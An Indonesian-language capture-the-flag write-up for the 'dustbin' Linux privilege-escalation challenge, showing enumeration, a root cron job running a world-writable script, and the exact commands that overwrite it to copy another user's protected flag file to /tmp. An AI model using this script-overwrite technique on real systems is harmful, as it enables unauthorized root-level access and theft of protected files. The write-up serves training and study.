dustbin (Misc / PrivEsc Challenge - SiebersecCTF)

Tantangan dustbin adalah tantangan kategori Misc yang berfokus pada teknik Linux Privilege Escalation (PrivEsc) dasar. Kerentanan utama yang dieksploitasi dalam tantangan ini adalah kesalahan konfigurasi izin akses (misconfigured file permissions) pada skrip otomatisasi yang dijalankan secara berkala oleh akun root (Cron Job).

1. Tahap Enumerasi & Analisis (Reconnaissance)

Setelah berhasil masuk ke server tantangan menggunakan koneksi netcat, kita mendapati diri kita berada di dalam sesi shell pengguna biasa bernama guest:

guest@7595d0499245:~$ whoami
guest


Di dalam direktori /home, terdapat dua pengguna terdaftar yaitu guest dan alice:

guest@7595d0499245:~$ ls -la /home
drwxr-xr-x 1 root  root  4096 Jun 16 11:35 .
drwxr-xr-x 1 root  root  4096 Jun 17 09:07 ..
drwxr-xr-x 1 alice alice 4096 Jun 16 11:35 alice
drwxr-xr-x 1 guest guest 4096 Jun 16 11:35 guest


Melihat ke dalam direktori /home/alice, terdapat file bendera target flag.txt dengan izin akses -r-------- (hanya bisa dibaca oleh pemiliknya, yaitu alice):

guest@7595d0499245:~$ ls -la /home/alice
total 24
drwxr-xr-x 1 alice alice 4096 Jun 16 11:35 .
...
-r-------- 1 alice alice   29 Jun 16 11:35 flag.txt


Saat mencoba membacanya langsung, kita mendapatkan pesan error karena kita tidak memiliki izin akses yang cukup:

guest@7595d0499245:~$ cat /home/alice/flag.txt
cat: /home/alice/flag.txt: Permission denied


2. Menemukan Celah Keamanan (Vulnerability Identification)

Petunjuk dari tantangan ini menyebutkan tentang aktivitas otomatisasi sampah ("AUTOMATICALLY take out the trash"). Berdasarkan hal tersebut, kita memeriksa konfigurasi Cron Jobs di server Linux ini.

Ditemukan sebuah file konfigurasi cron khusus bernama dustbin di /etc/cron.d/:

guest@7595d0499245:~$ cat /etc/cron.d/dustbin
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
* * * * * root /opt/dustbin/empty_trash.sh >/dev/null 2>&1


Analisis Cron Job:

Jadwal (* * * * *): Skrip dijalankan secara berkala setiap menit (setiap kali jam server menyentuh detik 00).

Pengguna (root): Skrip dijalankan dengan hak akses tertinggi, yaitu root.

Target Skrip: /opt/dustbin/empty_trash.sh.

Ketika kita memeriksa hak izin akses (file permissions) dari file /opt/dustbin/empty_trash.sh, ditemukan kelemahan yang sangat fatal:

guest@7595d0499245:~$ ls -la /opt/dustbin
total 12
drwxr-xr-x 1 root root 4096 Jun 16 11:35 .
drwxr-xr-x 1 root root 4096 Jun 16 11:35 ..
-rwxrwxrwx 1 root root   34 Jun 16 11:35 empty_trash.sh


Izin akses skrip tersebut diatur sebagai rwxrwxrwx (777), yang berarti semua pengguna (termasuk kita, guest) memiliki hak penuh untuk membaca, mengeksekusi, dan menulis/mengedit isi skrip tersebut.

3. Langkah Eksploitasi (Exploitation)

Karena kita dapat memodifikasi isi skrip yang akan otomatis dieksekusi oleh root setiap menit, kita dapat menyuntikkan perintah berbahaya (Command Injection / Script Overwrite) ke dalam file /opt/dustbin/empty_trash.sh.

Langkah 1: Mempersiapkan Payload

Kita mengubah isi skrip tersebut untuk membaca isi file flag.txt milik alice, menyalinnya ke direktori /tmp/flag.txt yang bersifat publik, dan mengubah izin aksesnya agar dapat dibaca oleh siapa saja (777):

echo -e '#!/bin/bash\ncat /home/alice/flag.txt > /tmp/flag.txt\nchmod 777 /tmp/flag.txt' > /opt/dustbin/empty_trash.sh


Verifikasi isi skrip untuk memastikan perintah sudah masuk:

guest@7595d0499245:~$ cat /opt/dustbin/empty_trash.sh
#!/bin/bash
cat /home/alice/flag.txt > /tmp/flag.txt
chmod 777 /tmp/flag.txt


Langkah 2: Menunggu Eksekusi Scheduler (Cron Job)

Karena cron job berjalan di latar belakang setiap pergantian menit, kita menunggu maksimal 60 detik sampai server mengeksekusi skrip modifikasi kita. Kita bisa memantaunya dengan perintah looping:

while true; do if [ -f /tmp/flag.txt ]; then echo -e "\n[+] FLAG DITEMUKAN:"; cat /tmp/flag.txt; break; fi; echo -n "."; sleep 1; done


Setelah beberapa detik berjalan, cron job berhasil dipicu oleh sistem, menyalin isi flag, dan memuntahkannya ke terminal kita:

......................
[+] FLAG DITEMUKAN:
sctf{be_careful_of_crontabs}
